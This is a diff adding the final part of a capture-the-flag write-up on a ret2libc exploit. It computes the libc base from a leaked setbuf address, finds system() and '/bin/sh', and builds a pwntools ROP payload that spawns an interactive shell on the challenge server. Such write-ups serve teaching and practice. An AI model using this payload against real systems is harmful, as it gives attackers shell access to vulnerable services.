@@ -138,3 +138,79 @@ log.info(f"Leaked setbuf Address -> {hex(leak)}")
 <img	src="Exploitation5.png"
 		alt="Challenge Description"
 />
+
+Now that we have an address inside libc we can calculate the base address of libc itself  
+First lets figure out the offset of setbuf() from the base address of libc
+
+<img	src="Exploitation6.png"
+		alt="Challenge Description"
+/>
+
+Now we can add this to our exploit
+
+```py
+setbuf_offset = 0x88540  # Static offset of setbuf() in libc
+libc_base = leak - setbuf_offset  # Calculate base address of libc
+log.info(f"libc Base Address -> {hex(libc_base)}")
+```
+
+To get a shell on the target system we will use the system() function which is also inside libc  
+Lets find its address
+
+<img	src="Exploitation7.png"
+		alt="Challenge Description"
+/>
+
+```py
+system_offset = 0x4F4E0  # Static offset of system() in libc
+libc_system = libc_base + system_offset # Calculate the actual address of system() in libc
+log.info(f"system Address -> {hex(libc_system)}")
+```
+
+We can pass "/bin/sh" to system() to get a shell  
+As this string is already present inside libc we dont need to put it on the stack ourselves  
+We can simply use the one already available to us  
+Lets find its address 
+
+<img	src="Exploitation8.png"
+		alt="Challenge Description"
+/>
+
+```py
+binsh_offset = 0x1B40FA  # Static offset of /bin/sh string in libc
+libc_binsh = libc_base + binsh_offset
+log.info(f"/bin/sh Address -> {hex(libc_binsh)}")
+```
+
+Now that we have all the relevant addresses we can finally craft our final payload  
+Here is the remaining exploit
+
+```py
+# ? Craft the payload to call system("/bin/sh")
+payload = padding  # Pad the stack until the stored RIP
+payload += pack.p64(pop_rdi)  # Set the address of the string /bin/sh as the first argument of system()
+payload += pack.p64(libc_binsh)  # This will be the first argument of system()
+payload += pack.p64(ret)  # Align the stack to 16 bytes otherwise system() will crash
+payload += pack.p64(libc_system)  # Call system()
+
+# ? Send the payload
+p.sendline(payload)
+
+# ? Start an interactive session
+p.interactive()
+```
+
+Notice we added another ROP Gadget (ret). This is to align the stack for the call to system()  
+If the stack isn't aligned then we will get a segmentation fault and the program will crash  
+Lets run the exploit script against the target server now
+
+<img	src="Exploitation9.png"
+		alt="Challenge Description"
+/>
+
+Nice. It works  
+Now we can grab the flag
+
+<img	src="Exploitation10.png"
+		alt="Challenge Description"
+/>
